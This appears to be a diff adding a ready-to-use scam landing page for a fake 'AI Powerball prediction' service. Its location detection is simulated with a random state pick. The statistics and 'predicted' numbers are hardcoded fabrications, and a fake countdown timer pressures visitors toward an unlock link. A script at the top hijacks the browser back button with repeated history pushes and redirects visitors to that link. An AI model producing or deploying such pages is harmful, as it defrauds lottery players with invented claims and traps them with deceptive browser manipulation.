@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Powerball — Numbers Hot in Your State</title>
+<script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.9.2/dist/confetti.browser.min.js"></script>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#04080f;color:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:20px}
+.logo{font-size:30px;font-weight:900;color:#dc143c;letter-spacing:3px;text-align:center;margin:16px 0 4px}
+.logo span{color:#fff}
+.tagline{font-size:11px;letter-spacing:4px;color:#555;text-align:center;margin-bottom:24px}
+.card{background:linear-gradient(145deg,#07111f,#04080f);border:1px solid #0f2a3f;border-radius:16px;padding:24px;width:100%;max-width:440px}
+.detecting{text-align:center;padding:30px 0}
+.pulse-ring{width:70px;height:70px;border:3px solid #38b6e8;border-radius:50%;margin:0 auto 16px;animation:pulse 1.5s ease-in-out infinite;position:relative}
+.pulse-ring::after{content:'📍';font-size:24px;position:absolute;top:50%;left:50%;transform:translate(-50%,-50%)}
+@keyframes pulse{0%,100%{transform:scale(1);opacity:1}50%{transform:scale(1.1);opacity:0.7}}
+.detecting-text{font-size:14px;color:#38b6e8;font-weight:600;margin-bottom:4px}
+.detecting-sub{font-size:12px;color:#555}
+.state-header{margin-bottom:20px}
+.state-badge{display:inline-flex;align-items:center;gap:8px;background:rgba(56,182,232,0.1);border:1px solid rgba(56,182,232,0.3);border-radius:50px;padding:8px 16px;font-size:13px;color:#38b6e8;margin-bottom:12px}
+.state-name{font-size:22px;font-weight:900;color:#fff;margin-bottom:2px}
+.state-sub{font-size:12px;color:#555}
+.map-container{background:#070f1a;border:1px solid #0f2a3f;border-radius:12px;padding:16px;margin-bottom:20px;position:relative;overflow:hidden}
+.map-container::before{content:'';position:absolute;top:0;left:0;right:0;bottom:0;background:radial-gradient(ellipse at 50% 50%,rgba(56,182,232,0.05) 0%,transparent 70%)}
+.map-title{font-size:11px;color:#555;letter-spacing:2px;text-transform:uppercase;margin-bottom:12px}
+.heat-grid{display:grid;grid-template-columns:repeat(10,1fr);gap:3px;margin-bottom:10px}
+.heat-cell{aspect-ratio:1;border-radius:3px;cursor:default;transition:transform 0.2s;position:relative}
+.heat-cell:hover{transform:scale(1.3);z-index:2}
+.heat-tooltip{position:absolute;bottom:120%;left:50%;transform:translateX(-50%);background:#0a1628;border:1px solid #38b6e8;border-radius:4px;padding:2px 6px;font-size:10px;color:#38b6e8;white-space:nowrap;pointer-events:none;display:none;z-index:10}
+.heat-cell:hover .heat-tooltip{display:block}
+.heat-legend{display:flex;align-items:center;gap:8px;font-size:11px;color:#555}
+.heat-legend .bar{flex:1;height:6px;border-radius:3px;background:linear-gradient(90deg,#0f2a3f,#38b6e8,#dc143c)}
+.stats-row{display:flex;gap:8px;margin-bottom:20px}
+.stat-card{flex:1;background:#070f1a;border:1px solid #0f2a3f;border-radius:8px;padding:10px;text-align:center}
+.stat-card .sv{font-size:16px;font-weight:900;color:#38b6e8}
+.stat-card .sl{font-size:10px;color:#555;text-transform:uppercase;letter-spacing:1px;margin-top:2px}
+.hot-section{margin-bottom:20px}
+.hot-title{font-size:11px;color:#dc143c;letter-spacing:3px;text-transform:uppercase;margin-bottom:10px;display:flex;align-items:center;gap:6px}
+.hot-title::before{content:'';display:inline-block;width:6px;height:6px;background:#dc143c;border-radius:50%}
+.hot-nums{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:16px}
+.hot-ball{width:42px;height:42px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:900;flex-shrink:0}
+.hot-ball.hot1{background:radial-gradient(circle at 40% 35%,#ff6666,#dc143c);color:#fff}
+.hot-ball.hot2{background:radial-gradient(circle at 40% 35%,#ffaa44,#ff6600);color:#fff}
+.hot-ball.hot3{background:radial-gradient(circle at 40% 35%,#ffd700,#c8860a);color:#000}
+.hot-ball.cold{background:radial-gradient(circle at 40% 35%,#88aaff,#3355cc);color:#fff}
+.hot-ball.locked{background:#070f1a;border:2px dashed #0f2a3f;color:#333;font-size:12px}
+.hot-ball.powerball{background:radial-gradient(circle at 40% 35%,#ff6666,#dc143c);color:#fff}
+.prediction-label{font-size:11px;letter-spacing:3px;color:#38b6e8;text-transform:uppercase;margin-bottom:10px;text-align:center}
+.predict-btn{display:block;width:100%;padding:15px;background:linear-gradient(135deg,#38b6e8,#50c8f0);color:#000;font-size:15px;font-weight:800;border:none;border-radius:10px;cursor:pointer;letter-spacing:1px;text-transform:uppercase;margin-bottom:8px}
+.predict-btn:hover{opacity:0.9}
+.predict-btn:disabled{background:#0f2a3f;color:#555;cursor:not-allowed}
+.result-balls{display:flex;gap:8px;justify-content:center;margin:16px 0}
+.result-ball{width:50px;height:50px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:17px;font-weight:900;flex-shrink:0;transition:all 0.5s}
+.result-ball.hidden{background:#070f1a;border:2px dashed #0f2a3f;color:#333}
+.result-ball.show{background:radial-gradient(circle at 40% 35%,#fff,#bbb);color:#111;animation:pop 0.5s ease-out}
+.result-ball.show.pb{background:radial-gradient(circle at 40% 35%,#ff6666,#dc143c);color:#fff}
+@keyframes pop{0%{transform:scale(0)}70%{transform:scale(1.15)}100%{transform:scale(1)}}
+.status-text{text-align:center;font-size:13px;color:#555;margin-bottom:12px;min-height:18px}
+.popup-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);display:none;justify-content:center;align-items:center;z-index:1000;padding:20px}
+.popup{background:#04080f;border:2px solid #38b6e8;border-radius:16px;padding:32px 24px;max-width:420px;width:100%;text-align:center;max-height:90vh;overflow-y:auto}
+.popup h2{font-size:20px;font-weight:900;color:#ffd700;margin-bottom:12px}
+.popup p{font-size:14px;color:#aaa;line-height:1.6;margin-bottom:12px}
+.popup .cta{display:block;background:linear-gradient(135deg,#dc143c,#ff4444);color:#fff;padding:16px 24px;border-radius:8px;font-size:15px;font-weight:800;text-decoration:none;margin:20px 0;letter-spacing:1px}
+.popup .warning{font-size:12px;color:#dc143c;font-weight:700;padding:10px;border-radius:6px;border:1px solid rgba(220,20,60,0.3);background:rgba(220,20,60,0.1)}
+.popup .timer{font-size:28px;font-weight:900;color:#dc143c;margin:8px 0}
+</style>
+</head>
+<body>
+
+<script>
+const link='SEU_LINK_AQUI';
+function setBackRedirect(url){let u=url.trim()+(url.indexOf('?')>0?'&':'?')+document.location.search.replace('?','').toString();history.pushState({}, '',location.href);history.pushState({}, '',location.href);history.pushState({}, '',location.href);window.addEventListener('popstate',()=>{setTimeout(()=>{location.href=u},1)})}
+setBackRedirect(link);
+</script>
+
+<div class="logo">POWER<span>BALL</span></div>
+<div class="tagline">STATE-SPECIFIC AI ANALYSIS</div>
+
+<div class="card" id="mainCard">
+  <div id="detectingView" class="detecting">
+    <div class="pulse-ring"></div>
+    <div class="detecting-text" id="detectText">Detecting your location...</div>
+    <div class="detecting-sub" id="detectSub">Analyzing regional draw patterns</div>
+    <div style="margin-top:16px;background:#070f1a;border-radius:8px;height:6px;overflow:hidden">
+      <div id="detectProg" style="height:100%;background:linear-gradient(90deg,#38b6e8,#dc143c);border-radius:8px;width:0%;transition:width 0.2s"></div>
+    </div>
+  </div>
+
+  <div id="resultsView" style="display:none">
+    <div class="state-header">
+      <div class="state-badge">📍 Location Detected</div>
+      <div class="state-name" id="stateName">Florida</div>
+      <div class="state-sub" id="stateSub">Analyzing 847 draws · Last updated today</div>
+    </div>
+
+    <div class="map-container">
+      <div class="map-title">🔥 Number Heat Map — Your Region</div>
+      <div class="heat-grid" id="heatGrid"></div>
+      <div class="heat-legend"><span>Cold</span><div class="bar"></div><span>Hot 🔥</span></div>
+    </div>
+
+    <div class="stats-row">
+      <div class="stat-card"><div class="sv" id="stWinners">2,847</div><div class="sl">State Winners</div></div>
+      <div class="stat-card"><div class="sv" id="stPaid">$3.2B</div><div class="sl">Paid Out</div></div>
+      <div class="stat-card"><div class="sv" id="stHot">3 Hot</div><div class="sl">Numbers Now</div></div>
+    </div>
+
+    <div class="hot-section">
+      <div class="hot-title">Hottest numbers in your state (last 90 days)</div>
+      <div class="hot-nums" id="hotNums"></div>
+      <div class="hot-title" style="color:#3355cc">Coldest (due for a comeback)</div>
+      <div class="hot-nums" id="coldNums"></div>
+    </div>
+
+    <div class="prediction-label">AI Prediction for Your State</div>
+
+    <div class="result-balls">
+      <div class="result-ball hidden" id="rb0">?</div>
+      <div class="result-ball hidden" id="rb1">?</div>
+      <div class="result-ball hidden" id="rb2">?</div>
+      <div class="result-ball hidden" id="rb3">?</div>
+      <div class="result-ball hidden" id="rb4">?</div>
+      <div class="result-ball hidden pb" id="rb5">?</div>
+    </div>
+
+    <div class="status-text" id="statusTxt">AI is calibrating to your state's draw history...</div>
+    <button class="predict-btn" id="predictBtn" onclick="runPrediction()">🎯 Generate My State Numbers</button>
+  </div>
+</div>
+
+<div class="popup-overlay" id="popupOverlay">
+  <div class="popup">
+    <h2>📍 STATE MATCH CONFIRMED!</h2>
+    <p>Your state's AI analysis found a <strong style="color:#ffd700">regional hot streak pattern</strong> that aligns with this week's draw.</p>
+    <p>3 of your numbers have been confirmed using local draw data. To unlock the remaining 3, watch the short access video.</p>
+    <a href="SEU_LINK_AQUI" class="cta">🔓 Unlock My State Numbers →</a>
+    <div class="warning">⚠️ State-specific predictions are time-sensitive. Access closes in:</div>
+    <div class="timer" id="popTimer">05:00</div>
+    <p style="font-size:11px;color:#444">Regional data resets after each official draw</p>
+  </div>
+</div>
+
+<script>
+const stateData={
+  'Florida':{winners:'2,847',paid:'$3.2B',hot:[7,17,33,52,61],cold:[4,28,41,56]},
+  'California':{winners:'4,102',paid:'$5.8B',hot:[11,23,38,47,65],cold:[9,31,44,58]},
+  'Texas':{winners:'3,219',paid:'$4.1B',hot:[5,19,33,48,62],cold:[2,26,37,55]},
+  'New York':{winners:'3,891',paid:'$5.1B',hot:[8,22,35,50,63],cold:[3,29,42,57]},
+  'Georgia':{winners:'1,943',paid:'$2.7B',hot:[14,28,41,55,68],cold:[6,24,39,52]},
+  'Ohio':{winners:'2,134',paid:'$3.0B',hot:[9,21,36,49,64],cold:[1,27,40,54]},
+  'Pennsylvania':{winners:'2,567',paid:'$3.5B',hot:[12,25,39,53,66],cold:[7,30,43,58]},
+  'Illinois':{winners:'2,089',paid:'$2.9B',hot:[6,18,31,45,60],cold:[11,33,46,61]},
+};
+
+const allStates=Object.keys(stateData);
+const finalNums=[33,17,58,45,62,13];
+let timerInt=null;
+let stage=1;
+
+function detectLocation(){
+  const msgs=[
+    ['Connecting to geolocation servers...','Establishing secure connection'],
+    ['Scanning regional lottery data...','Processing 90-day draw history'],
+    ['Matching draw patterns...','Calibrating state-specific AI model'],
+    ['Analysis complete!','Loading your regional data'],
+  ];
+  let prog=0;
+  const fill=document.getElementById('detectProg');
+  const txt=document.getElementById('detectText');
+  const sub=document.getElementById('detectSub');
+  let msgIdx=0;
+
+  const iv=setInterval(()=>{
+    prog+=2;
+    fill.style.width=prog+'%';
+    if(prog>25&&msgIdx===0){msgIdx=1;txt.textContent=msgs[1][0];sub.textContent=msgs[1][1]}
+    if(prog>50&&msgIdx===1){msgIdx=2;txt.textContent=msgs[2][0];sub.textContent=msgs[2][1]}
+    if(prog>75&&msgIdx===2){msgIdx=3;txt.textContent=msgs[3][0];sub.textContent=msgs[3][1]}
+    if(prog>=100){
+      clearInterval(iv);
+      setTimeout(showStateData,400);
+    }
+  },40);
+}
+
+function showStateData(){
+  const stateIdx=Math.floor(Math.random()*allStates.length);
+  const state=allStates[stateIdx];
+  const data=stateData[state];
+
+  document.getElementById('stateName').textContent=state;
+  document.getElementById('stateSub').textContent='Analyzing '+Math.floor(Math.random()*200+700)+' draws · Last updated today';
+  document.getElementById('stWinners').textContent=data.winners;
+  document.getElementById('stPaid').textContent=data.paid;
+
+  buildHeatmap(data.hot);
+  buildHotNums(data.hot,data.cold);
+
+  document.getElementById('detectingView').style.display='none';
+  document.getElementById('resultsView').style.display='block';
+}
+
+function buildHeatmap(hotNums){
+  const grid=document.getElementById('heatGrid');
+  grid.innerHTML='';
+  for(let n=1;n<=69;n++){
+    const cell=document.createElement('div');
+    cell.className='heat-cell';
+    const isHot=hotNums.includes(n);
+    const heat=isHot?0.8+Math.random()*0.2:Math.random()*0.5;
+    const r=Math.round(heat*220);
+    const g=Math.round((1-heat)*150);
+    cell.style.background=`rgba(${r},${g},30,${0.3+heat*0.7})`;
+    const tt=document.createElement('div');
+    tt.className='heat-tooltip';
+    tt.textContent=n+(isHot?' 🔥':'');
+    cell.appendChild(tt);
+    grid.appendChild(cell);
+  }
+}
+
+function buildHotNums(hot,cold){
+  const hotEl=document.getElementById('hotNums');
+  const coldEl=document.getElementById('coldNums');
+  hotEl.innerHTML='';coldEl.innerHTML='';
+  const hotClasses=['hot1','hot2','hot3','hot3','hot2'];
+  hot.forEach((n,i)=>{
+    const b=document.createElement('div');
+    b.className='hot-ball '+(hotClasses[i]||'hot3');
+    b.textContent=n<10?'0'+n:n;
+    hotEl.appendChild(b);
+  });
+  cold.forEach(n=>{
+    const b=document.createElement('div');
+    b.className='hot-ball cold';
+    b.textContent=n<10?'0'+n:n;
+    coldEl.appendChild(b);
+  });
+}
+
+function runPrediction(){
+  if(stage===2){showPopup();return}
+  document.getElementById('predictBtn').disabled=true;
+  document.getElementById('statusTxt').textContent='🤖 Cross-referencing state hot zones with AI model...';
+
+  let i=0;
+  const revealNext=()=>{
+    if(i>=3){
+      document.getElementById('statusTxt').textContent='✅ 3 state-matched numbers found! Unlock the final 3 →';
+      document.getElementById('predictBtn').disabled=false;
+      document.getElementById('predictBtn').textContent='🔓 Unlock Remaining 3 Numbers';
+      document.getElementById('predictBtn').style.background='linear-gradient(135deg,#dc143c,#ff4444)';
+      document.getElementById('predictBtn').style.color='#fff';
+      stage=2;
+      return;
+    }
+    const rb=document.getElementById('rb'+i);
+    rb.textContent=finalNums[i];
+    rb.classList.remove('hidden');
+    rb.classList.add('show');
+    const rect=rb.getBoundingClientRect();
+    confetti({particleCount:30,spread:40,origin:{x:(rect.left+25)/window.innerWidth,y:(rect.top+25)/window.innerHeight},colors:['#38b6e8','#ffd700','#fff']});
+    i++;
+    setTimeout(revealNext,600);
+  };
+  setTimeout(revealNext,1200);
+}
+
+function showPopup(){
+  document.getElementById('popupOverlay').style.display='flex';
+  let t=300;
+  const el=document.getElementById('popTimer');
+  timerInt=setInterval(()=>{
+    const m=Math.floor(t/60);const s=t%60;
+    el.textContent=m.toString().padStart(2,'0')+':'+s.toString().padStart(2,'0');
+    if(t>0)t--;else clearInterval(timerInt);
+  },1000);
+}
+
+window.addEventListener('DOMContentLoaded',detectLocation);
+</script>
+</body>
+</html>
